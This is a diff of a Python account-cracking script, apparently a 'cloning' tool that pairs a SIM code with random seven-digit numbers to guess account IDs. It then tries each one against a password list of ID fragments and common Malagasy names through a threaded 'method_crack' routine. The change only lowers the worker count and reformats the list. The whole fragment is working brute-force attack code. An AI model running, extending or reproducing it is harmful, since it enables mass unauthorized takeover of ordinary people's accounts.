@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=100) as Dipto:
+    with tred(max_workers=90) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],ids[:3],'princia','Princia','nilaina','Nilaina','nirina','Nirina','lafatra','Lafatra','lahatra','Lahatra','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fitiavana','Fitiavana','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','mandresy','Mandresy','andriatsitohaina','Andriatsitohaina','sarobidy','Sarobidy','lalaina','Lafatra','lalatiana','Lalatiana','lalaina','Lalaina','kanto','Kanto']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],ids[:3],'princia', 'Princia', 'nilaina', 'Nilaina', 'nirina', 'Nirina', 'lafatra', 'Lafatra', 'lahatra', 'Lahatra', 'amboara', 'Amboara', 'miangaly', 'Miangaly','miangola','Miangola','fitiavana','Fitiavana','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','mandresy','Mandresy','andriatsitohaina','Andriatsitohaina','sarobidy','Sarobidy','lalaina','Lafatra','lalatiana','Lalatiana','lalaina','Lalaina','kanto','Kanto']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
